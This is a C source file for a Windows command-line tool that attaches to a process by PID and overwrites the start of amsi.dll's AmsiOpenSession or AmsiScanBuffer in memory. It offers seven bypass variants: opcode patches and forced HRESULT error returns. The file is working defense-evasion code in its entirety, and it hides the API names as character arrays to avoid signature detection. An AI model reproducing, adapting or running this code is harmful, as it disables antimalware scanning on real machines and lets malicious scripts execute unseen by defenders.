/* Thanks to Saad!!
 * Code Snippet was shared to me By Saad aka @D1rkMtr (https://twitter.com/D1rkMtr/)
 * I added Some other patches based on my Small research using Windbg.
 */

#include <Windows.h>
#include <stdio.h>
#pragma comment(lib, "ntdll")


#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

unsigned char ams1[] = { 'a','m','s','i','.','d','l','l', 0x0 };
unsigned char ams10pen[] = { 'A','m','s','i','O','p','e','n','S','e','s','s','i','o','n', 0x0 };
unsigned char ams15can[] = { 'A','m','s','i','S','c','a','n','B','u','f','f','e','r', 0x0};

EXTERN_C NTSTATUS NtProtectVirtualMemory(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN OUT PSIZE_T RegionSize,
	IN ULONG NewProtect,
	OUT PULONG OldProtect);

EXTERN_C NTSTATUS NtWriteVirtualMemory(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress,
	IN PVOID Buffer,
	IN SIZE_T NumberOfBytesToWrite,
	OUT PSIZE_T NumberOfBytesWritten OPTIONAL);


/*
DWORD64 GetAddr(LPVOID addr) {

	for (int i = 0; i < 1024; i++) {
		
		if (*((PBYTE)addr + i) == 0x74) return (DWORD64)addr + i;
	}

}
*/


// Technique by Saad aka @D1rkMtr (https://twitter.com/D1rkMtr/) (https://github.com/TheD1rkMtr/AMSI_patch)
// 1
void AMS1patch_OpenSession_jne(HANDLE hproc)
{

	void* ptr = GetProcAddress(LoadLibraryA((LPCSTR)ams1), (LPCSTR)ams10pen);

	char Patch[100];
	ZeroMemory(Patch, 100);

	// Pasting jne opcode
	lstrcatA(Patch, "\x75");

	printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)Patch);

	DWORD OldProtect = 0;
	SIZE_T memPage = 0x1000;
	//void* ptraddr = (void*)(((INT_PTR)ptr + 0xa));

	// Editing Target: Pointer to the 3rd offset of the amsi!OpenSession
	void* ptraddr = (void*)((DWORD64)ptr + 0x3);
	//void* ptraddr2 = (void*)GetAddr(ptr);
	
	printf("Starting Address of the Function: 0x%p\t%p\t\n", ptr, *(DWORD64*)(DWORD64)ptr);
	printf("Target Address of the function to Edit: 0x%p\t%p\t\n", ptraddr, *(DWORD64*)(DWORD64)ptraddr);
	//printf("0x%p\t%p\t\n", ptraddr2, *(DWORD64*)(DWORD64)ptraddr2);

	//NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, 0x04, &OldProtect);
	// 														OUT PVOID*
	//NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, 0x04, &OldProtect);
	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus1)) {
		printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
		return;
	}
	//NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)GetAddr(ptr), (PVOID)Patch, 1, (SIZE_T*)nullptr);
	// 														IN PVOID
	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)((DWORD64)ptr + 0x3), (PVOID)Patch, 1, (SIZE_T*)nullptr);
	if (!NT_SUCCESS(NtWriteStatus)) {
		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
		return;
	}
	//NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus2)) {
		printf("[!] Failed in NtProtectVirtualMemory (%u)\n", GetLastError());
		return;
	}
	
	printf("\n[+] AMS1 patched\n\tSkipping entering `amsi!AmsiOpenSession+0x4c` via `jne`, if all instructions succeed before the calling of `jne`\n\t=> We would end up directly to `amsi!AmsiCloseSession`.\n\n");
}

// 2
void AMS1patch_OpenSession_ret(HANDLE hproc)
{
	void* ptr = GetProcAddress(LoadLibraryA((LPCSTR)ams1), (LPCSTR)ams10pen);

	char Patch[100];
	ZeroMemory(Patch, 100);

	// Pasting ret opcode
	lstrcatA(Patch, "\xc3");

	printf("\n[+] The Patch : %p\n", *(INT_PTR*)Patch);

	DWORD OldProtect = 0;
	SIZE_T memPage = 0x1000;
	//void* ptraddr = (void*)(((INT_PTR)ptr + 0xa));

	// Editing Target: Pointer to the opening of amsi!OpenSession
	void* ptraddr = (void*)((DWORD64)ptr);
	//void* ptraddr2 = (void*)GetAddr(ptr);

	printf("Starting Address of the Function: 0x%p\t%p\t\n", ptr, *(DWORD64*)(DWORD64)ptr);
	printf("Target Address of the function to Edit: 0x%p\t%p\t\n", ptraddr, *(DWORD64*)(DWORD64)ptraddr);
	//printf("0x%p\t%p\t\n", ptraddr2, *(DWORD64*)(DWORD64)ptraddr2);
	
	// Allocating memory at the Beginning of the amsi!OpenSession for edting
	//NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, 0x04, &OldProtect);
	// 														OUT PVOID*
	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus1)) {
		printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
		return;
	}
	//NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)GetAddr(ptr), (PVOID)Patch, 1, (SIZE_T*)nullptr);
	// 														IN PVOID
	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)((DWORD64)ptr), (PVOID)Patch, 1, (SIZE_T*)nullptr);
	if (!NT_SUCCESS(NtWriteStatus)) {
		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
		return;
	}
	//NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus2)) {
		printf("[!] Failed in NtProtectVirtualMemory (%u)\n", GetLastError());
		return;
	}
	
	printf("\n[+] AMS1 patched\n\tSkipping entering `amsi!AmsiOpenSession+0x4c` via `ret`, by directly pasting `c3` at the beginning of the `amsi!AmsiOpenSession`\n\t=> We would end up directly to `amsi!AmsiCloseSession`.\n\n");
}

// 3
void AMS1patch_ScanBuffer_ret(HANDLE hproc)
{
	void* ptr = GetProcAddress(LoadLibraryA((LPCSTR)ams1), (LPCSTR)ams15can);

	char Patch[100];
	ZeroMemory(Patch, 100);

	// Pasting ret opcode
	lstrcatA(Patch, "\xc3");

	printf("\n[+] The Patch : %p\n", *(INT_PTR*)Patch);

	DWORD OldProtect = 0;
	SIZE_T memPage = 0x1000;
	//void* ptraddr = (void*)(((INT_PTR)ptr + 0xa));

	// Editing Target: Pointer to the opening of amsi!ScanBuffer
	void* ptraddr = (void*)((DWORD64)ptr);
	//void* ptraddr2 = (void*)GetAddr(ptr);	
	
	printf("Starting Address of the Function: 0x%p\t%p\t\n", ptr, *(DWORD64*)(DWORD64)ptr);
	printf("Target Address of the function to Edit: 0x%p\t%p\t\n", ptraddr, *(DWORD64*)(DWORD64)ptraddr);
	//printf("0x%p\t%p\t\n", ptraddr2, *(DWORD64*)(DWORD64)ptraddr2);
	
	//NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, 0x04, &OldProtect);
	// 														OUT PVOID*
	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus1))
	{
		printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
		return;
	}
	//NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)GetAddr(ptr), (PVOID)Patch, 1, (SIZE_T*)nullptr);
	// 														IN PVOID
	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)((DWORD64)ptr), (PVOID)Patch, 1, (SIZE_T*)nullptr);
	if (!NT_SUCCESS(NtWriteStatus)) {
		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
		return;
	}
	//NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus2)) {
		printf("[!] Failed in NtProtectVirtualMemory (%u)\n", GetLastError());
		return;
	}
	
	printf("\n[+] AMS1 patched\n\tSkipping the execution of the main intructions of `amsi!AmsiScanBuffer` via `ret`, by directly pasting `c3` at the beginning of the `amsi!AmsiScanBuffer`\n\n");
}

// 4
void AMS1patch_RastaMouse(HANDLE hproc)
{
	void* ptr = GetProcAddress(LoadLibraryA((LPCSTR)ams1), (LPCSTR)ams15can);

	//char Patch[100];
	//ZeroMemory(Patch, 100);

	printf("\n[+] Here, the value (rather error Value) of HRESULT being 'E_INVALIDARG'\tSource: https://pre.empt.dev/posts/maelstrom-etw-amsi/#Historic_AMSI_Bypasses\n");

	// Pasting ret opcode
	//lstrcatA(Patch, "\xB8\x57\x00\x07\x80\xC3");
	
	// Little Endian
	printf("[+] The Patch : %p\n", *(INT_PTR*)"\xB8\x57\x00\x07\x80\xC3");

	//lstrcatA(Patch, "\x00\x57\xB8");
	//lstrcatA(Patch, "\xB8\x57\x00\x07");
	//printf("[+] The Patch : %p\n", *(INT_PTR*)Patch);
	
	
	//lstrcatA(Patch, "\x80\xc3");
	//printf("[+] The Patch : %p\n", *(LONG_PTR*)Patch);

	DWORD OldProtect = 0;
	SIZE_T memPage = 0x1000;
	//void* ptraddr = (void*)(((INT_PTR)ptr + 0xa));

	// Editing Target: Pointer to the opening of amsi!ScanBuffer
	void* ptraddr = (void*)((DWORD64)ptr);
	//void* ptraddr2 = (void*)GetAddr(ptr);
		
	printf("Starting Address of the Function: 0x%p\t%p\t\n", ptr, *(DWORD64*)(DWORD64)ptr);
	printf("Target Address of the function to Edit: 0x%p\t%p\t\n", ptraddr, *(DWORD64*)(DWORD64)ptraddr);
	//printf("0x%p\t%p\t\n", ptraddr2, *(DWORD64*)(DWORD64)ptraddr2);
	
	//NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, 0x04, &OldProtect);
	// 														OUT PVOID*
	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus1)) {
		printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
		return;
	}
	//NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)GetAddr(ptr), (PVOID)Patch, 1, (SIZE_T*)nullptr);
	// 														IN PVOID
	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)((DWORD64)ptr), (PVOID)"\xB8\x57\x00\x07\x80\xC3", 6, (SIZE_T*)nullptr);
	if (!NT_SUCCESS(NtWriteStatus)) {
		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
		return;
	}
	//NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus2)) {
		printf("[!] Failed in NtProtectVirtualMemory (%u)\n", GetLastError());
		return;
	}
	
	printf("\n[+] AMS1 patched\n\tBypassing the branch that does the actual scanning in `amsi!AmsiScanBuffer` and returns, by directly pasting `\\xB8\\x57\\x00\\x07\\x80\\xC3` ('mov eax, 0x80070057; ret') at the beginning of the `amsi!AmsiScanBuffer`\n\n");
}

// 5
void AMS1patch_E_ACCESSDENIED(HANDLE hproc)
{
	void* ptr = GetProcAddress(LoadLibraryA((LPCSTR)ams1), (LPCSTR)ams15can);

	//char Patch[100];
	//ZeroMemory(Patch, 100);

	printf("[+] Here, the value (rather error Value) of HRESULT being 'E_ACCESSDENIED'\tSource: https://pre.empt.dev/posts/maelstrom-etw-amsi/#Historic_AMSI_Bypasses\n");

	// Pasting ret opcode
	//lstrcatA(Patch, "\xB8\x05\x00\x07\x80\xC3");

	// Little Endian
	printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)"\xB8\x05\x00\x07\x80\xC3");

	DWORD OldProtect = 0;
	SIZE_T memPage = 0x1000;
	//void* ptraddr = (void*)(((INT_PTR)ptr + 0xa));

	// Editing Target: Pointer to the opening of amsi!ScanBuffer
	void* ptraddr = (void*)((DWORD64)ptr);
	//void* ptraddr2 = (void*)GetAddr(ptr);


	printf("Starting Address of the Function: 0x%p\t%p\t\n", ptr, *(DWORD64*)(DWORD64)ptr);
	printf("Target Address of the function to Edit: 0x%p\t%p\t\n", ptraddr, *(DWORD64*)(DWORD64)ptraddr);
	//printf("0x%p\t%p\t\n", ptraddr2, *(DWORD64*)(DWORD64)ptraddr2);
	
	//NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, 0x04, &OldProtect);
	// 														OUT PVOID*
	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus1)) {
		printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
		return;
	}
	//NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)GetAddr(ptr), (PVOID)Patch, 1, (SIZE_T*)nullptr);
	// 														IN PVOID
	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)((DWORD64)ptr), (PVOID)"\xB8\x05\x00\x07\x80\xC3", 6, (SIZE_T*)nullptr);
	if (!NT_SUCCESS(NtWriteStatus)) {
		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
		return;
	}
	//NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus2)) {
		printf("[!] Failed in NtProtectVirtualMemory (%u)\n", GetLastError());
		return;
	}
	
	printf("\n[+] AMS1 patched\n\tBypassing the branch that does the actual scanning in `amsi!AmsiScanBuffer` and returns, by directly pasting `\\xB8\\x05\\x00\\x07\\x80\\xC3` ('mov eax, 0x80070005; ret') at the beginning of the `amsi!AmsiScanBuffer`\n\n");
}

// 6
void AMS1patch_E_HANDLE(HANDLE hproc)
{
	void* ptr = GetProcAddress(LoadLibraryA((LPCSTR)ams1), (LPCSTR)ams15can);

	//char Patch[100];
	//ZeroMemory(Patch, 100);

	printf("[+] Here, the value (rather error Value) of HRESULT being 'E_HANDLE'\tSource: https://pre.empt.dev/posts/maelstrom-etw-amsi/#Historic_AMSI_Bypasses\n");

	// Pasting ret opcode
	//lstrcatA(Patch, "\xB8\x06\x00\x07\x80\xC3");

	// Little Endian
	printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)"\xB8\x06\x00\x07\x80\xC3");

	DWORD OldProtect = 0;
	SIZE_T memPage = 0x1000;
	//void* ptraddr = (void*)(((INT_PTR)ptr + 0xa));

	// Editing Target: Pointer to the opening of amsi!ScanBuffer
	void* ptraddr = (void*)((DWORD64)ptr);
	//void* ptraddr2 = (void*)GetAddr(ptr);
		
	printf("Starting Address of the Function: 0x%p\t%p\t\n", ptr, *(DWORD64*)(DWORD64)ptr);
	printf("Target Address of the function to Edit: 0x%p\t%p\t\n", ptraddr, *(DWORD64*)(DWORD64)ptraddr);
	//printf("0x%p\t%p\t\n", ptraddr2, *(DWORD64*)(DWORD64)ptraddr2);

	//NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, 0x04, &OldProtect);
	// 														OUT PVOID*
	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus1)) {
		printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
		return;
	}
	//NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)GetAddr(ptr), (PVOID)Patch, 1, (SIZE_T*)nullptr);
	// 														IN PVOID
	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)((DWORD64)ptr), (PVOID)"\xB8\x06\x00\x07\x80\xC3", 6, (SIZE_T*)nullptr);
	if (!NT_SUCCESS(NtWriteStatus)) {
		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
		return;
	}
	//NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus2)) {
		printf("[!] Failed in NtProtectVirtualMemory (%u)\n", GetLastError());
		return;
	}
	
	printf("\n[+] AMS1 patched\n\tBypassing the branch that does the actual scanning in `amsi!AmsiScanBuffer` and returns, by directly pasting `\\xB8\\x06\\x00\\x07\\x80\\xC3` ('mov eax, 0x80070006; ret') at the beginning of the `amsi!AmsiScanBuffer`\n\n");
}

// 7
void AMS1patch_E_OUTOFMEMORY(HANDLE hproc)
{
	void* ptr = GetProcAddress(LoadLibraryA((LPCSTR)ams1), (LPCSTR)ams15can);

	//char Patch[100];
	//ZeroMemory(Patch, 100);

	// Pasting ret opcode
	//lstrcatA(Patch, "\xB8\x0E\x00\x07\x80\xC3");

	printf("[+] Here, the value (rather error Value) of HRESULT being 'E_OUTOFMEMORY'\tSource: https://pre.empt.dev/posts/maelstrom-etw-amsi/#Historic_AMSI_Bypasses\n");

	printf("\n[+] The Patch : %p\n\n", *(INT_PTR*)"\xB8\x0E\x00\x07\x80\xC3");

	DWORD OldProtect = 0;
	SIZE_T memPage = 0x1000;
	//void* ptraddr = (void*)(((INT_PTR)ptr + 0xa));

	// Edting the Beginning of the amsi!ScanBuffer
	void* ptraddr = (void*)((DWORD64)ptr);
	//void* ptraddr2 = (void*)GetAddr(ptr);
		

	printf("Starting Address of the Function: 0x%p\t%p\t\n", ptr, *(DWORD64*)(DWORD64)ptr);
	printf("Target Address of the function to Edit: 0x%p\t%p\t\n", ptraddr, *(DWORD64*)(DWORD64)ptraddr);
	//printf("0x%p\t%p\t\n", ptraddr2, *(DWORD64*)(DWORD64)ptraddr2);


	//NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, 0x04, &OldProtect);
	// 														OUT PVOID*
	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus1)) {
		printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
		return;
	}
	//NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)GetAddr(ptr), (PVOID)Patch, 1, (SIZE_T*)nullptr);
	// 														IN PVOID
	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)((DWORD64)ptr), (PVOID)"\xB8\x0E\x00\x07\x80\xC3", 6, (SIZE_T*)nullptr);
	if (!NT_SUCCESS(NtWriteStatus)) {
		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
		return;
	}
	//NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus2)) {
		printf("[!] Failed in NtProtectVirtualMemory (%u)\n", GetLastError());
		return;
	}
	
	printf("\n[+] AMS1 patched\n\tBypassing the branch that does the actual scanning in `amsi!AmsiScanBuffer` and returns, by directly pasting `\\xB8\\x0E\\x00\\x07\\x80\\xC3` ('mov eax, 0x8007000E; ret') at the beginning of the `amsi!AmsiScanBuffer`\n\n");
}


int main(int argc, char** argv)
{
	HANDLE hproc;

	if (argc != 3)
	{
		printf("\nUSAGE: .\\%s <PID> <patch type>\n", argv[0]);
		printf("\n[1] patch_via_OpenSession_jne\n[2] patch_via_OpenSession_ret\n[3] patch_via_ScanBuffer_ret\n[4] patch_via_@RastaMouse\n[5] patch_via_E_ACCESSDENIED_error_code\n[6] patch_via_E_HANDLE_error_code\n[7] patch_via_E_OUTOFMEMORY_error_code\n\n");
		return 1;
	}

	hproc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)atoi(argv[1]));
	if (!hproc)
	{
		printf("Failed in OpenProcess (%u)\n", GetLastError());
		return 2;
	}

	if ((DWORD)atoi(argv[2]) == 1)
	{
		AMS1patch_OpenSession_jne(hproc);
	}
	else if ((DWORD)atoi(argv[2]) == 2)
	{
		AMS1patch_OpenSession_ret(hproc);
	}
	else if ((DWORD)atoi(argv[2]) == 3)
	{
		AMS1patch_ScanBuffer_ret(hproc);
	}
	else if ((DWORD)atoi(argv[2]) == 4)
	{
		AMS1patch_RastaMouse(hproc);
	}
	else if ((DWORD)atoi(argv[2]) == 5)
	{
		AMS1patch_E_ACCESSDENIED(hproc);
	}
	else if ((DWORD)atoi(argv[2]) == 6)
	{
		AMS1patch_E_HANDLE(hproc);
	}
	else if ((DWORD)atoi(argv[2]) == 7)
	{
		AMS1patch_E_OUTOFMEMORY(hproc);
	}
	else
	{
		printf("[!] Wrong Option");
	}
	
	return 0;

}